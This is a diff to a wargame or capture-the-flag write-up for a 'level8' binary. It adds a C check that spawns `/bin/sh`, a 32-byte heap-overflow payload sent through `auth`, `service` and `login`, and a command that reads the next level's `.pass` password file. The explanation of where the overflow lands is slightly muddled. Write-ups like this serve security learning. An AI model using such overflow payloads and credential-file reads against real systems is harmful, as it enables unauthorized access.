@@ -42,11 +42,27 @@ The binary manages two pointers, `auth` and `service`, and processes commands: `
 
 We use the `auth` command to allocate the structure, then the `service` command with a long string to overflow and set the 0x20th byte of the `auth` structure to a non-zero value. Finally, we use the `login` command to trigger the shell.
 
+```c
+if (*(auth + 0x20) != 0) {
+    system("/bin/sh");
+}
+```
+
+However, the `auth` buffer is only 4 bytes long, so we cannot reach offset 0x20 directly with the `auth` command. Instead, we use the `service` command, which copies our input into a buffer that is allocated right after `auth` in memory. By sending a string of 32 characters (the padding) with the `service` command, we overflow the `auth` buffer and set the byte at offset 0x20 to a non-zero value (for example, 'A').
+
+**Payload:**
+
+- Send `auth ` to allocate the buffer.
+- Send `service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` (32 'A's) to overflow and set the 0x20th byte.
+- Send `login` to trigger the shell.
+
+This padding ensures that the check `*(auth + 0x20) != 0` will succeed, giving us a shell.
+
 Example commands:
 
 ```
 ./level8
-auth
+auth 
 service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 login
 cat /home/user/level9/.pass
